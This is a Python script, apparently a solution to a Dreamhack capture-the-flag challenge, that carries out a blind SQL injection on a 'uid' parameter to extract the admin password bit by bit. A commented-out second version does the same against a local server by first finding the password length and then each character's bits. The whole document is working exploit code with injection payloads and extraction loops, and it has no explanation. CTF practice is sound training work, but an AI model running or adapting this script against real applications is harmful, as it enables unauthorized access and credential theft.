import requests
from urllib import parse

s = requests.Session()

url = "http://host1.dreamhack.games:12475/?uid="
query = "admin' and substr(lpad(bin(ord(substr(upw,{},1))), 24, 0), {}, 1) -- "
i = 1
flagbit = 0
flag = ''

while(1):
    for j in range(1, 0x19):
        res = s.get(url+parse.quote(query.format(i, j)))
        print(i, j)
        if "exists." in res.text:
            flagbit += 1 << (0x18 - j)
    if flagbit > 127:
        flag += flagbit.to_bytes(3, "big").decode()
        flagbit = 0
        print(flag)
    else:
        flag += chr(flagbit)
        flagbit = 0
        print(flag)
    if(flag[-1] == '}'):
        break
    i += 1

"""
from requests import get

host = "http://localhost:5000"

password_length = 0
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length: {password_length}")

password = ""
for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
    
    bits = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            bits += "1"
        else:
            bits += "0"
    print(f"character {i}'s bits: {bits}")

    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")

print(password)

"""